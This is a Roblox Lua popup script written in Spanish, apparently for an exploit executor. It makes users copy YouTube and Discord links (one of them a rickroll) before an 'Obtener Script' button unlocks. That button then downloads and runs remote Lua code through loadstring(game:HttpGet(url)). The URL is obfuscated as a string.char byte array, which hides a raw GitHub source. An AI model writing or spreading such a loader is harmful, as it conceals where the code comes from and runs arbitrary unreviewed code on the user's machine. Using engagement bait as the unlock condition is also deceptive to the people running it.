local T=game:GetService("TweenService")
local P=game.Players.LocalPlayer
local G=Instance.new("ScreenGui",P.PlayerGui)
G.Name="KatoPopup"

local F=Instance.new("Frame",G)
F.Size=UDim2.new(0,400,0,500)
F.Position=UDim2.new(0.5,-200,1,0)
F.BackgroundColor3=Color3.fromRGB(25,25,25)
F.BackgroundTransparency=0.2

Instance.new("UICorner",F).CornerRadius=UDim.new(0,15)

local L={"https://youtube.com/@KatoScripts","https://youtu.be/dQw4w9WgXcQ","https://discord.gg/tu-servidor"}
local N={"📺 Suscribirse","👍 Like al video","💬 Unirse al Discord"}
local C=0

for i=1,3 do
    local B=Instance.new("TextButton",F)
    B.Size=UDim2.new(0.8,0,0,40)
    B.Position=UDim2.new(0.1,0,0.2+i*0.12,0)
    B.Text=N[i]
    B.BackgroundColor3=Color3.fromRGB(50,50,50)
    B.TextColor3=Color3.fromRGB(255,255,255)
    B.Font=Enum.Font.Gotham
    B.TextSize=16
    Instance.new("UICorner",B).CornerRadius=UDim.new(0,8)
    B.MouseButton1Click:Connect(function()
        setclipboard(L[i])
        B.Text="✅ Completado"
        B.BackgroundColor3=Color3.fromRGB(0,200,0)
        C=C+1
    end)
end

local Ptxt=Instance.new("TextLabel",F)
Ptxt.Size=UDim2.new(1,0,0,30)
Ptxt.Position=UDim2.new(0,0,0.7,0)
Ptxt.Text="Progreso: 0/3"
Ptxt.TextColor3=Color3.fromRGB(0,255,0)
Ptxt.Font=Enum.Font.Code
Ptxt.TextSize=14
Ptxt.BackgroundTransparency=1

local U=Instance.new("TextButton",F)
U.Size=UDim2.new(0.8,0,0,50)
U.Position=UDim2.new(0.1,0,0.8,0)
U.Text="🔒 Obtener Script"
U.BackgroundColor3=Color3.fromRGB(80,80,80)
U.TextColor3=Color3.fromRGB(200,200,200)
U.Font=Enum.Font.GothamBold
U.TextSize=18
Instance.new("UICorner",U).CornerRadius=UDim.new(0,10)

local url=string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,116,105,101,110,107,104,97,110,104,49,47,115,112,105,99,121,47,109,97,105,110,47,67,104,105,108,108,105,46,108,117,97)

U.MouseButton1Click:Connect(function()
    if C>=3 then
        F:Destroy()
        loadstring(game:HttpGet(url))()
    end
end)

game:GetService("RunService").RenderStepped:Connect(function()
    Ptxt.Text="Progreso: "..C.."/3"
    if C>=3 then
        U.Text="✅ Obtener Script"
        U.BackgroundColor3=Color3.fromRGB(0,200,0)
    end
end)

T:Create(F,TweenInfo.new(0.6,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Position=UDim2.new(0.5,-200,0.5,-250)}):Play()
